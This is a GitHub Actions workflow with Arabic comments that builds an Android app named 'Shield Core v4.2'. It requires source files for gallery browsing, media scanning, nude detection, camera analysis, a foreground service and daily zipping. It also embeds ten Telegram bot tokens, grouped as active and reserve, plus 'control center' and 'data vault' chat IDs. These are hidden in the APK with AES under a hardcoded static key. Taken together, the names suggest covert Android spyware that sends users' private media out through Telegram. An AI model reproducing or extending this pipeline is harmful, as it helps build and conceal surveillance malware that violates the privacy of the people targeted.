name: Build Android Kotlin APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Force clean all caches
        run: |
          echo "🧹 Removing all caches..."
          rm -rf ~/.gradle/caches/ || true
          rm -rf ~/.gradle/wrapper/ || true
          rm -rf ~/.android/build-cache/ || true
          rm -rf .gradle/ || true
          rm -rf build/ || true
          rm -rf app/build/ || true
          echo "✅ All caches removed."

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      # ============================================================
      # ✅ إنشاء ملف tokens.enc من GitHub Secrets (قبل Gradle)
      # ============================================================
      - name: Install cryptography for token encryption
        run: pip install cryptography

      - name: Generate encrypted tokens.enc
        env:
          BOT_1: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
          BOT_2: ${{ secrets.TELEGRAM_BOT_2_TOKEN }}
          BOT_3: ${{ secrets.TELEGRAM_BOT_3_TOKEN }}
          BOT_4: ${{ secrets.TELEGRAM_BOT_4_TOKEN }}
          BOT_5: ${{ secrets.TELEGRAM_BOT_5_TOKEN }}
          BOT_6: ${{ secrets.TELEGRAM_BOT_6_TOKEN }}
          BOT_7: ${{ secrets.TELEGRAM_BOT_7_TOKEN }}
          BOT_8: ${{ secrets.TELEGRAM_BOT_8_TOKEN }}
          BOT_9: ${{ secrets.TELEGRAM_BOT_9_TOKEN }}
          BOT_10: ${{ secrets.TELEGRAM_BOT_10_TOKEN }}
          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
          VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
          SECRET: ${{ secrets.TELEGRAM_SECRET }}
        run: |
          python3 -c "
import json, base64, os, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

# Static Asset Key (يجب أن يتطابق مع المفتاح في ConfigLoader.kt)
key_str = 's3cr3t_s@lt_2024|ShieldCore_v4.2|!@#\$%^&*()_+|9876543210'
key = hashlib.sha256(key_str.encode('utf-8')).digest()

data = {
    'active': [os.environ['BOT_1'], os.environ['BOT_2'], os.environ['BOT_3'], os.environ['BOT_4'], os.environ['BOT_5'], os.environ['BOT_6']],
    'reserve': [os.environ['BOT_7'], os.environ['BOT_8'], os.environ['BOT_9'], os.environ['BOT_10']],
    'ctrl_id': int(os.environ['CTRL_ID']),
    'vault_id': int(os.environ['VAULT_ID']),
    'secret': os.environ['SECRET']
}

json_str = json.dumps(data).encode('utf-8')
padder = padding.PKCS7(128).padder()
padded_data = padder.update(json_str) + padder.finalize()

cipher = Cipher(algorithms.AES(key), modes.ECB())
encryptor = cipher.encryptor()
encrypted = encryptor.update(padded_data) + encryptor.finalize()

encoded = base64.b64encode(encrypted).decode('utf-8')
os.makedirs('app/src/main/assets', exist_ok=True)
with open('app/src/main/assets/tokens.enc', 'w') as f:
    f.write(encoded)
print('✅ tokens.enc generated and encrypted successfully')
          "

      # ============================================================
      # ✅ التحقق من وجود ملف tokens.enc بعد إنشائه
      # ============================================================
      - name: Verify tokens.enc exists
        run: |
          if [ -f "app/src/main/assets/tokens.enc" ]; then
            echo "✅ tokens.enc created successfully."
          else
            echo "❌ tokens.enc not found!"
            exit 1
          fi

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.2'
          validate-wrappers: false

      # ============================================================
      # ✅ 1. التحقق من وجود الملفات الأساسية قبل البناء
      # ============================================================
      - name: Check critical source files
        id: check_files
        run: |
          echo "🔍 Checking critical source files..."
          MISSING_FILES=""
          
          # قائمة الملفات الأساسية المطلوبة للبناء
          CRITICAL_FILES=(
            "app/src/main/java/com/example/app/MainActivity.kt"
            "app/src/main/java/com/example/app/DailyZipper.kt"
            "app/src/main/java/com/example/app/Monitor.kt"
            "app/src/main/java/com/example/app/TelegramUi.kt"
            "app/src/main/java/com/example/app/Commands.kt"
            "app/src/main/java/com/example/app/GalleryBrowser.kt"
            "app/src/main/java/com/example/app/MediaScanner.kt"
            "app/src/main/java/com/example/app/NudeDetector.kt"
            "app/src/main/java/com/example/app/CameraAnalyzer.kt"
            "app/src/main/java/com/example/app/ConfigLoader.kt"
            "app/src/main/java/com/example/app/SecurityHelper.kt"
            "app/src/main/java/com/example/app/FileDownloader.kt"
            "app/src/main/java/com/example/app/StreamManager.kt"
            "app/src/main/java/com/example/app/MapExtensions.kt"
            "app/src/main/java/com/example/app/ForegroundService.kt"
            "app/src/main/AndroidManifest.xml"
            "app/build.gradle.kts"
            "build.gradle.kts"
            "settings.gradle.kts"
            "gradle.properties"
          )
          
          for file in "${CRITICAL_FILES[@]}"; do
            if [ ! -f "$file" ]; then
              echo "❌ Missing: $file"
              MISSING_FILES="$MISSING_FILES\n  - $file"
            else
              echo "✅ Found: $file"
            fi
          done
          
          if [ -n "$MISSING_FILES" ]; then
            echo "⚠️ WARNING: Some critical files are missing!"
            echo "MISSING_FILES=true" >> $GITHUB_OUTPUT
            echo "MISSING_LIST=$MISSING_FILES" >> $GITHUB_OUTPUT
          else
            echo "✅ All critical files found!"
            echo "MISSING_FILES=false" >> $GITHUB_OUTPUT
          fi

      # ============================================================
      # ✅ 2. عرض هيكل المشروع لتسهيل التصحيح
      # ============================================================
      - name: Print project structure (debug)
        run: |
          echo "===== Project Structure (app/src/main/java) ====="
          find app/src/main/java -type f -name "*.kt" | sort || echo "No Kotlin files found!"
          echo ""
          echo "===== Project Structure (app/src/main/res) ====="
          find app/src/main/res -type f | sort || echo "No resource files found!"
          echo ""
          echo "===== Project Structure (app/src/main/assets) ====="
          find app/src/main/assets -type f | sort || echo "No assets found!"

      - name: Print DailyZipper.kt content
        run: |
          echo "===== DailyZipper.kt content ====="
          cat app/src/main/java/com/example/app/DailyZipper.kt || echo "File not found!"
          echo "================================="

      # ============================================================
      # ✅ 3. التنظيف والبناء باستخدام Gradle (مع الاحتياطي)
      # ============================================================
      - name: Clean project
        run: |
          gradle clean --no-daemon || ./gradlew clean --no-daemon || true

      - name: Build Release APK with full capture
        id: build
        run: |
          set +e
          # محاولة استخدام gradle أولاً، ثم ./gradlew كاحتياطي
          if command -v gradle &> /dev/null; then
            gradle assembleRelease -Dorg.gradle.jvmargs="-Xmx2048m -Dfile.encoding=UTF-8" \
              --no-daemon --stacktrace --info --warning-mode all > /tmp/gradle-full-output.log 2>&1
          else
            ./gradlew assembleRelease -Dorg.gradle.jvmargs="-Xmx2048m -Dfile.encoding=UTF-8" \
              --no-daemon --stacktrace --info --warning-mode all > /tmp/gradle-full-output.log 2>&1
          fi
          BUILD_EXIT_CODE=$?
          set -e
          echo "BUILD_EXIT_CODE=$BUILD_EXIT_CODE" >> $GITHUB_OUTPUT
          if [ $BUILD_EXIT_CODE -ne 0 ]; then
            echo "❌ Build failed with exit code $BUILD_EXIT_CODE"
            echo "📄 Searching for Kotlin compilation errors (e: ) in log:"
            grep -i "e: " /tmp/gradle-full-output.log || echo "No 'e: ' lines found."
            echo "----------------------------------------"
            echo "📄 Full build log (last 300 lines):"
            tail -n 300 /tmp/gradle-full-output.log
            exit $BUILD_EXIT_CODE
          else
            echo "✅ Build succeeded!"
          fi

      - name: Upload APK Artifact
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: app-release
          path: app/build/outputs/apk/release/app-release-unsigned.apk

      - name: Send APK to Telegram
        if: success()
        env:
          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
          CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
        run: |
          APK_PATH="app/build/outputs/apk/release/app-release-unsigned.apk"
          if [ -f "$APK_PATH" ]; then
            APK_SIZE=$(du -h "$APK_PATH" | cut -f1)
            CAPTION="✅ *Shield Core v4.2 (Kotlin)*%0A• Build Success (Release)!%0A• Minified & Optimized%0A• Size: $APK_SIZE%0A• $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
            curl -s -F "chat_id=$CHAT_ID" -F "document=@$APK_PATH" -F "caption=$CAPTION" -F "parse_mode=Markdown" \
              "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
          else
            echo "⚠️ APK file not found!"
          fi

      # ============================================================
      # ✅ 4. تقرير فشل شامل مع معلومات تفصيلية
      # ============================================================
      - name: Send comprehensive failure report
        if: failure()
        env:
          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
          CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
        run: |
          REPORT_FILE="build_failure_report.txt"
          {
            echo "❌ BUILD FAILURE REPORT"
            echo "========================"
            echo ""
            echo "📦 Repository: ${{ github.repository }}"
            echo "🔄 Run ID: ${{ github.run_id }}"
            echo "📅 Date: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
            echo ""
            echo "📂 Build Environment:"
            echo "  - OS: ${{ runner.os }}"
            echo "  - JDK: 17"
            echo "  - Gradle: 8.2 (installed via setup-gradle)"
            echo ""
            echo "📄 CRITICAL FILES CHECK:"
            echo "------------------------"
            echo "${{ steps.check_files.outputs.MISSING_LIST || '✅ All files found' }}"
            echo ""
            echo "📄 DailyZipper.kt content:"
            echo "--------------------------"
            cat app/src/main/java/com/example/app/DailyZipper.kt 2>/dev/null || echo "File not found!"
            echo ""
            echo "📄 MainActivity.kt content (first 100 lines):"
            echo "--------------------------------------------"
            head -n 100 app/src/main/java/com/example/app/MainActivity.kt 2>/dev/null || echo "File not found!"
            echo ""
            echo "📄 AndroidManifest.xml content:"
            echo "-------------------------------"
            cat app/src/main/AndroidManifest.xml 2>/dev/null || echo "File not found!"
            echo ""
            echo "📄 app/build.gradle.kts content:"
            echo "--------------------------------"
            cat app/build.gradle.kts 2>/dev/null || echo "File not found!"
            echo ""
            echo "📄 Project Structure (Kotlin files):"
            echo "------------------------------------"
            find app/src/main/java -type f -name "*.kt" | sort 2>/dev/null || echo "No files found!"
            echo ""
            echo "📄 Gradle Version:"
            echo "------------------"
            gradle --version 2>/dev/null || ./gradlew --version 2>/dev/null || echo "Gradle not found!"
            echo ""
            echo "🔍 KOTLIN COMPILATION ERRORS (e: lines):"
            echo "----------------------------------------"
            if [ -f /tmp/gradle-full-output.log ]; then
              grep -i "e: " /tmp/gradle-full-output.log || echo "No 'e: ' lines found."
            else
              echo "No log file found."
            fi
            echo ""
            echo "🔍 FULL GRADLE OUTPUT (last 300 lines):"
            echo "----------------------------------------"
            if [ -f /tmp/gradle-full-output.log ]; then
              tail -n 300 /tmp/gradle-full-output.log
            else
              echo "No log file found."
            fi
            echo ""
            echo "🔍 WARNINGS (last 50):"
            echo "----------------------"
            if [ -f /tmp/gradle-full-output.log ]; then
              grep -i "warning" /tmp/gradle-full-output.log | tail -n 50 || echo "No warnings found."
            else
              echo "No log file found."
            fi
            echo ""
            echo "--- End of report ---"
          } > "$REPORT_FILE"
          curl -s -F "chat_id=$CHAT_ID" -F "document=@$REPORT_FILE" -F "caption=❌ تقرير فشل البناء الكامل - اضغط لفتح الملف ونسخ المحتوى" \
            "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
